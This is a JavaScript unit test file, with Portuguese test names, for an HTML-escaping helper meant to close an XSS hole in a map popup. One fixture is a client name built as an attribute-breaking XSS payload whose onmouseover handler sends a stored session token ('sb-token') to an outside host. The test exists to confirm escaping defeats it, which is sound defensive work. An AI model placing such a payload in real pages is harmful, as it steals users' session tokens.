import { test } from 'node:test'
import assert from 'node:assert/strict'
import { escHtml } from './html-escape.js'

test('escHtml: troca os 5 caracteres que quebram HTML', () => {
  assert.equal(escHtml('<b>&"\''), '&lt;b&gt;&amp;&quot;&#39;')
})

test('escHtml: aspa no nome do cliente não fecha o title="…" (o XSS do popup do mapa)', () => {
  const cliente = 'Joao" onmouseover="fetch(`//x.io?`+localStorage.getItem(`sb-token`))'
  const html = `<span title="${escHtml(cliente)}">${escHtml(cliente)}</span>`
  // o atributo só pode ter as DUAS aspas que o próprio template pôs
  assert.equal((html.match(/"/g) ?? []).length, 2)
  assert.ok(!html.includes('" onmouseover='))
  // e com aspa simples também (atributo title='…')
  assert.ok(!escHtml("D'Ávila' onclick='x").includes("'"))
})

test('escHtml: & sai primeiro — entidade já escrita é mostrada literal, não interpretada', () => {
  assert.equal(escHtml('&lt;script&gt;'), '&amp;lt;script&amp;gt;')
})

test('escHtml: vazio/nulo vira "" (o chamador usa `|| "—"`), número vira texto', () => {
  assert.equal(escHtml(null), '')
  assert.equal(escHtml(undefined), '')
  assert.equal(escHtml(''), '')
  assert.equal(escHtml(0), '0')
  assert.equal(escHtml(1234), '1234')
})

test('escHtml: texto comum passa igual (acento, barra, hífen)', () => {
  assert.equal(escHtml('Fazenda São João - Ji-Paraná/RO'), 'Fazenda São João - Ji-Paraná/RO')
})
